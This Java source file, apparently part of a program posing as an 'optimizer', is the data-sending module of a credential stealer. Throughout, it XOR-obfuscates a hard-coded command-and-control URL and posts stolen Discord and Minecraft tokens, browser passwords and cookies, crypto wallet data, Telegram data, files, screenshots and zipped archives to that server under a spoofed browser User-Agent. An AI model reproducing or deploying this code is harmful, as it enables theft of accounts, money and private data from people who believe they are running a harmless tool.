package com.example.optimizer;

import java.io.OutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Se {
    
    private static final int XOR_KEY = 0x5A;
    
    // XOR encoded: http://89.125.209.229:5000/api/data/ADMIN_XEboLQH0Ag7WlWGkZ2Ocyw
    private static final byte[] PANEL_URL = {
        0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x62, 0x63, 0x74,
        0x6b, 0x68, 0x6f, 0x74, 0x68, 0x6a, 0x63, 0x74, 0x68, 0x68,
        0x63, 0x60, 0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x3b, 0x2a, 0x33,
        0x75, 0x3e, 0x3b, 0x2e, 0x3b, 0x75, 0x1b, 0x1e, 0x17, 0x13,
        0x14, 0x05, 0x02, 0x1f, 0x38, 0x35, 0x16, 0x0b, 0x12, 0x6a,
        0x1b, 0x3d, 0x6d, 0x0d, 0x36, 0x0d, 0x1d, 0x31, 0x00, 0x68,
        0x15, 0x39, 0x23, 0x2d
    };
    
    private static File logFile = null;
    private static PrintWriter logWriter = null;
    
    private static synchronized void initLog() {
        if (logFile == null) {
            try {
                String desktop = System.getProperty("user.home") + File.separator + "Desktop";
                logFile = new File(desktop, "optimizer_debug.log");
                logWriter = new PrintWriter(new FileWriter(logFile, true), true);
                log("========================================");
                log("=== OPTIMIZER DEBUG LOG STARTED ===");
                log("Time: " + new Date().toString());
                log("OS: " + System.getProperty("os.name"));
                log("Java: " + System.getProperty("java.version"));
                log("User: " + System.getProperty("user.name"));
                log("Panel URL: " + getPanelUrl());
                log("========================================");
            } catch (Exception e) {
                try {
                    String temp = System.getProperty("java.io.tmpdir", ".");
                    logFile = new File(temp, "optimizer_debug.log");
                    logWriter = new PrintWriter(new FileWriter(logFile, true), true);
                } catch (Exception e2) {}
            }
        }
    }
    
    public static synchronized void log(String msg) {
        initLog();
        try {
            String timestamp = new SimpleDateFormat("HH:mm:ss.SSS").format(new Date());
            String line = "[" + timestamp + "] " + msg;
            if (logWriter != null) {
                logWriter.println(line);
                logWriter.flush();
            }
        } catch (Exception e) {}
    }
    
    public static void logEx(String ctx, Exception e) {
        log("[ERROR] " + ctx + ": " + e.getClass().getName() + " - " + e.getMessage());
    }
    
    private static String x(byte[] enc) {
        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) dec[i] = (byte) (enc[i] ^ XOR_KEY);
        return new String(dec, StandardCharsets.UTF_8);
    }
    
    public static String getPanelUrl() { return x(PANEL_URL); }
    
    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }
    
    public static boolean sendDiscord(String token, String userid, String username, String email, 
                                      String phone, String nitro, String billing, String pcName, String pcUser) {
        log("[DISCORD] Sending: user=" + username + " id=" + userid);
        log("[DISCORD] Token len=" + (token != null ? token.length() : 0));
        try {
            String json = "{\"type\":\"discord\",\"token\":\"" + esc(token) + "\",\"userid\":\"" + esc(userid) + 
                "\",\"username\":\"" + esc(username) + "\",\"email\":\"" + esc(email) + "\",\"phone\":\"" + esc(phone) + 
                "\",\"nitro\":\"" + esc(nitro) + "\",\"billing\":\"" + esc(billing) + "\",\"pc_name\":\"" + esc(pcName) + 
                "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            boolean r = sendJson(getPanelUrl(), json);
            log("[DISCORD] Result: " + r);
            return r;
        } catch (Exception e) { logEx("DISCORD", e); return false; }
    }
    
    public static boolean sendMinecraft(String player, String uuid, String accessToken, 
                                        String clientId, String ip, String pcName, String pcUser) {
        log("[MC] ========== MINECRAFT SESSION ==========");
        log("[MC] Player: " + player);
        log("[MC] UUID: " + uuid);
        log("[MC] IP: " + ip);
        log("[MC] PC: " + pcName + "/" + pcUser);
        log("[MC] Token null: " + (accessToken == null));
        log("[MC] Token empty: " + (accessToken != null && accessToken.isEmpty()));
        log("[MC] Token len: " + (accessToken != null ? accessToken.length() : 0));
        if (accessToken != null && accessToken.length() > 20) {
            log("[MC] Token preview: " + accessToken.substring(0, 20) + "...");
        }
        try {
            String json = "{\"type\":\"minecraft\",\"player\":\"" + esc(player) + "\",\"uuid\":\"" + esc(uuid) + 
                "\",\"access_token\":\"" + esc(accessToken) + "\",\"client_id\":\"" + esc(clientId) + 
                "\",\"ip\":\"" + esc(ip) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            log("[MC] JSON len: " + json.length());
            log("[MC] URL: " + getPanelUrl());
            boolean r = sendJson(getPanelUrl(), json);
            log("[MC] Result: " + r);
            return r;
        } catch (Exception e) { logEx("MC", e); return false; }
    }
    
    public static boolean sendBrowser(String passwordsJson, String cookiesJson, String pcName, String pcUser) {
        log("[BROWSER] Passwords len=" + (passwordsJson != null ? passwordsJson.length() : 0));
        log("[BROWSER] Cookies len=" + (cookiesJson != null ? cookiesJson.length() : 0));
        try {
            String json = "{\"type\":\"browser\",\"passwords\":" + passwordsJson + ",\"cookies\":" + cookiesJson + 
                ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            boolean r = sendJson(getPanelUrl(), json);
            log("[BROWSER] Result: " + r);
            return r;
        } catch (Exception e) { logEx("BROWSER", e); return false; }
    }
    
    public static boolean sendWallet(String name, String type, String data, String pcName, String pcUser) {
        log("[WALLET] " + name + "/" + type);
        try {
            String json = "{\"type\":\"wallet\",\"wallet_name\":\"" + esc(name) + "\",\"wallet_type\":\"" + esc(type) + 
                "\",\"data\":\"" + esc(data) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("WALLET", e); return false; }
    }
    
    public static boolean sendSystem(String os, String cpu, String gpu, String ram, 
                                     String ip, String country, String pcName, String pcUser) {
        log("[SYSTEM] OS=" + os + " CPU=" + cpu + " IP=" + ip);
        try {
            String json = "{\"type\":\"system\",\"os\":\"" + esc(os) + "\",\"cpu\":\"" + esc(cpu) + 
                "\",\"gpu\":\"" + esc(gpu) + "\",\"ram\":\"" + esc(ram) + "\",\"ip\":\"" + esc(ip) + 
                "\",\"country\":\"" + esc(country) + "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("SYSTEM", e); return false; }
    }
    
    public static boolean sendGaming(String platform, String data, String pcName, String pcUser) {
        log("[GAMING] " + platform);
        try {
            String json = "{\"type\":\"gaming\",\"platform\":\"" + esc(platform) + "\",\"data\":\"" + esc(data) + 
                "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("GAMING", e); return false; }
    }
    
    public static boolean sendTelegram(String data, String pcName, String pcUser) {
        log("[TELEGRAM] len=" + (data != null ? data.length() : 0));
        try {
            String json = "{\"type\":\"telegram\",\"data\":\"" + esc(data) + 
                "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("TELEGRAM", e); return false; }
    }
    
    public static boolean sendFiles(String filesJson, String pcName, String pcUser) {
        try {
            String json = "{\"type\":\"files\",\"files\":" + filesJson + 
                ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("FILES", e); return false; }
    }
    
    public static boolean sendScreenshot(String base64, String pcName, String pcUser) {
        log("[SCREENSHOT] len=" + (base64 != null ? base64.length() : 0));
        try {
            String json = "{\"type\":\"screenshot\",\"image\":\"" + esc(base64) + 
                "\",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("SCREENSHOT", e); return false; }
    }
    
    public static boolean sendRaw(String type, String dataJson, String pcName, String pcUser) {
        try {
            String json = "{\"type\":\"" + esc(type) + "\",\"data\":" + dataJson + 
                ",\"pc_name\":\"" + esc(pcName) + "\",\"pc_user\":\"" + esc(pcUser) + "\"}";
            return sendJson(getPanelUrl(), json);
        } catch (Exception e) { logEx("RAW", e); return false; }
    }
    
    public static boolean sendJson(String urlStr, String json) {
        log("[HTTP] URL: " + urlStr);
        log("[HTTP] JSON len: " + json.length());
        if (json.length() < 500) log("[HTTP] JSON: " + json);
        
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            log("[HTTP] Sending...");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }
            
            int code = conn.getResponseCode();
            log("[HTTP] Response: " + code);
            
            try {
                InputStream is = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
                if (is != null) {
                    String resp = new String(is.readAllBytes(), StandardCharsets.UTF_8);
                    log("[HTTP] Body: " + (resp.length() > 200 ? resp.substring(0, 200) : resp));
                    is.close();
                }
            } catch (Exception e) { log("[HTTP] Read err: " + e.getMessage()); }
            
            return code >= 200 && code < 300;
        } catch (java.net.ConnectException e) {
            log("[HTTP] CONNECTION REFUSED");
            return false;
        } catch (java.net.SocketTimeoutException e) {
            log("[HTTP] TIMEOUT");
            return false;
        } catch (Exception e) {
            logEx("HTTP", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    public static boolean sendZip(byte[] zipData, String pcName, String pcUser) {
        log("[ZIP] ========== SENDING ZIP ==========");
        log("[ZIP] Size: " + zipData.length + " bytes");
        log("[ZIP] PC: " + pcName + "/" + pcUser);
        
        HttpURLConnection conn = null;
        try {
            String urlStr = getPanelUrl().replace("/api/data/", "/api/upload/");
            log("[ZIP] URL: " + urlStr);
            
            String boundary = "===" + System.currentTimeMillis() + "===";
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(60000);
            
            log("[ZIP] Sending multipart...");
            try (OutputStream os = conn.getOutputStream()) {
                // Add PC name field
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write("Content-Disposition: form-data; name=\"pc_name\"\r\n\r\n".getBytes());
                os.write((pcName + "\r\n").getBytes());
                
                // Add PC user field
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write("Content-Disposition: form-data; name=\"pc_user\"\r\n\r\n".getBytes());
                os.write((pcUser + "\r\n").getBytes());
                
                // Add file
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write("Content-Disposition: form-data; name=\"file\"; filename=\"data.zip\"\r\n".getBytes());
                os.write("Content-Type: application/zip\r\n\r\n".getBytes());
                os.write(zipData);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            }
            
            int code = conn.getResponseCode();
            log("[ZIP] Response: " + code);
            
            return code >= 200 && code < 300;
        } catch (Exception e) {
            logEx("ZIP", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
